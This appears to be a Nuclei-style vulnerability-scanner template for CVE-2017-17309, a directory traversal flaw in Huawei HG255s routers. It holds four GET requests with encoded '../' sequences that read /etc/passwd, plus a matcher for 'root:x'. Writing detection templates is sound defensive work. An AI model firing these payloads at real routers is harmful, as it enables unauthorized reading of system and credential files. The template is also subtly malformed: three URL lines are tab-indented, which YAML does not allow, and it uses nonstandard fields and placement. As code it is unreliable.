id: hg255s-directory-traversal
info:
  name: HG255s Directory Traversal Vulnerability
  description: Detects directory traversal vulnerability in HG255s routers
  author: Ismail Tasdelen
  severity: high
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-17309
    - https://www.exploit-db.com/exploits/47923
    - https://www.huawei.com/en/psirt/security-notices/huawei-sn-20170911-01-hg255s-en
    - https://github.com/exploit-labs/huawei_hg255s_exploit

requests:
  - method: GET
    url:
      - 'http://TARGET_IP_ADDR/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
	    - 'http://TARGET_IP_ADDR/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
	    - 'http://TARGET_IP_ADDR/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
	    - 'http://TARGET_IP_ADDR/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
    matchers:
      - type: word
        words:
          - 'root:x'
        part: body
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Connection: keep-alive
